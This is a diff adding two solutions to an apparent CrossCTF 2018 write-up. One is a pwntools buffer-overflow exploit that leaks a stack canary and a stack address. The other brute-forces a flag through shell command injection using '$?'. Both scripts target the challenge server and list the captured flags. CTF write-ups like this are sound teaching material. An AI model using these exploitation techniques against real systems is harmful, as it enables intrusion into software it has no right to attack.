@@ -383,3 +383,88 @@ console.log(v4.toString(16));
 ```
 
 Flag: `crossctf{RSA_Challenges_Are_Too_Easy}`
+
+# Real Baby Pwnable
+
+## Problem
+
+This is an actual baby pwn challenge.
+
+[realbabypwn](/blog/crossctf-2018-writeup/Real-Baby-Pwnable/realbabypwn)
+
+## Solution
+
+Code:
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+# sh = process('./realbabypwn')
+sh = remote('ctf.pwn.sg', 1500)
+
+print sh.recvuntil('? ')
+sh.sendline('289')
+canary = sh.recvuntil(') ').split('\n')[0][22:]
+canary = int(canary)
+print hex(canary)
+
+sh.sendline('y')
+print sh.recvuntil('? ')
+sh.sendline('291')
+pwn = sh.recvuntil(') ').split('\n')[0][22:]
+pwn = int(pwn)-482
+print hex(pwn)
+sh.sendline('n')
+print sh.recvuntil('? ')
+payload = 'a'*264
+payload += p64(canary)
+payload += p64(pwn)
+payload += p64(pwn)
+payload += p64(pwn)
+payload += p64(pwn)
+
+sh.send(payload.ljust(0x200, '\x90'))
+sh.interactive()
+```
+
+Notes:
+
+* Have to leak the stack canary and include it in the payload
+* Have to leak a random stack address and calculate the relative offset to the `babymode` (`-482` in this case)
+
+Flag: `CrossCTF{It3r4t1ve_0ver_R3curs1v3}`
+
+# Even Flow
+
+## Problem
+
+Do you like shell command injection?
+
+[evenflow.py](/blog/crossctf-2018-writeup/Even-Flow/evenflow.py)
+
+## Solution
+
+```python
+from pwn import *
+
+flag = 'CrossCTF{'
+
+while True:
+  sh = remote('ctf.pwn.sg', 1601)
+  sh.recvuntil(': ')
+  sh.sendline(flag)
+  sh.recvuntil(': ')
+  sh.sendline('$?')
+  flag += chr(int(sh.recvall().split('\n')[0]))
+  sh.close()
+  print flag
+```
+
+Notes:
+
+* `$?` in bash stores the return code of the last command
+* `strcmp` returns the next char code or difference
+
+Flag: `CrossCTF{I_just_want_someone_to_say_to_me}`
